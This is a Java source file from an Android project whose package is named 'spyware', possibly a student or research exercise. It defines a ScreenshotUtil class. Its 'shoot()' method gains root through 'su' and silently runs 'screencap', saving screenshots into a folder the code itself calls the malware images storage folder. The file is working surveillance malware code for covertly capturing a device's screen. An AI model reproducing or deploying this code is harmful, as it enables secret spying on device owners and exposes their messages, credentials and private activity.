package com.example.cristianturetta.spyware;

import android.graphics.Bitmap;
import android.util.Log;
import android.view.View.MeasureSpec;
import android.view.View;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.util.Date;

public class ScreenshotUtil {
    private static ScreenshotUtil mInstance;

    private ScreenshotUtil(){}

    public static ScreenshotUtil getInstance(){
        if (mInstance == null){
            synchronized (ScreenshotUtil.class) {
                if (mInstance == null){
                    mInstance = new ScreenshotUtil();
                }
            }
        }
        return mInstance;
    }

    /**
     * Measures and takes a screenshot of the given View {@link View}
     *
     * @param view The view which the screenshot is taken.
     * @return A {@link Bitmap} for the taken screenshot
     */
    public Bitmap takeScreenshotForView(View view){
        // Measures
        view.measure(MeasureSpec.makeMeasureSpec(view.getWidth(), MeasureSpec.EXACTLY),
                MeasureSpec.makeMeasureSpec(view.getHeight(), MeasureSpec.EXACTLY));

        view.layout((int) view.getX(), (int) view.getY(),
                (int) view.getX() + view.getMeasuredWidth(), (int) view.getY() + view.getMeasuredHeight());

        view.setDrawingCacheEnabled(true);
        view.buildDrawingCache(true);
        Bitmap bitmap = Bitmap.createBitmap(view.getDrawingCache());
        view.setDrawingCacheEnabled(false);

        return bitmap;
    }

    /**
     * Takes a screenshot using super user privileges
     *
     */
    public void shoot(){
        try {
            Date date = new Date();
            android.text.format.DateFormat.format("yyyy-MM-dd hh:mm:ss", date);
            String fileName = date + ".jpg";
            fileName = fileName.replaceAll(" ", "_");
            fileName = fileName.replace(":", ".");

            String filePath =  FileUtil.getInstance().getMalwareImagesStorageFolder().getAbsolutePath()
                    + File.separator + fileName;

            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("screencap -p " + filePath);
            os.flush();
            os.close();
            process.waitFor();
            if (process.exitValue() == 0){
                Log.d("ScreenshotUtil", "Screenshot taken and saved in " + filePath);
            }else {
                Log.d("ScreenshotUtil", "Screenshot not taken");
            }

        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
